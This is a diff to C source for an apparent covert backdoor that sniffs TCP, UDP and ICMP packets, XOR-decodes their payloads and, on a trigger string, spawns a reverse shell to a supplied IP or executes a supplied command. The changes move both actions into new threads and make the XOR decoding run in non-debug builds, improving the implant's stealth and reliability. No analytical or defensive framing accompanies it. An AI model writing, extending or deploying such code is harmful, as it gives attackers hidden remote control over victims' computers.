@@ -10,7 +10,8 @@ void compare(int payloadLength, char* data)
 #ifdef DEBUG
 			printf("%s", data);
 #endif
-			rev(rip);
+			// rev(rip);
+			CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)&rev, rip, 0, NULL);
 		}
 		else if (strncmp(data, COMMAND, 6) == 0)
 		{
@@ -18,7 +19,8 @@ void compare(int payloadLength, char* data)
 #ifdef DEBUG
 			printf("%s", data);
 #endif
-			exec(cmd);
+			// exec(cmd);
+			CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)&exec, cmd, 0, NULL);
 		}
 	}
 }
@@ -34,7 +36,7 @@ void handleTCP(char* buffer, struct ip_hdr_s* ip_header) {
 		{
 			char* data = (char*)(buffer + BUFFER_OFFSET_TCP_DATA);
 			int payloadLength = ntohs(ip_header->ip_len) - IP_HEADER_SIZE - BUFFER_SIZE_TCP;
-#ifdef DEBUG
+#ifndef DEBUG
             XORCipher(data, XOR_KEY, payloadLength);
 #endif
 			data[payloadLength - 1] = '\0';
@@ -51,7 +53,7 @@ void handleUDP(char* buffer, struct ip_hdr_s* ip_header) {
 	{
 		char* data = (char*)(buffer + BUFFER_OFFSET_UDP_DATA);
 		int payloadLength = ntohs(ip_header->ip_len) - IP_HEADER_SIZE - BUFFER_SIZE_UDP;
-#ifdef DEBUG
+#ifndef DEBUG
             XORCipher(data, XOR_KEY, payloadLength);
 #endif
 		data[payloadLength - 1] = '\0';
@@ -68,8 +70,7 @@ void handleICMP(char* buffer, struct ip_hdr_s* ip_header) {
 	{
 		char* data = (char*)(buffer + BUFFER_OFFSET_ICMP_DATA);
 		int payloadLength = ntohs(ip_header->ip_len) - IP_HEADER_SIZE - BUFFER_SIZE_ICMP;
-#ifdef DEBUG
-			printf("%s", data);
+#ifndef DEBUG
             XORCipher(data, XOR_KEY, payloadLength);
 #endif
 		data[payloadLength - 1] = '\0';
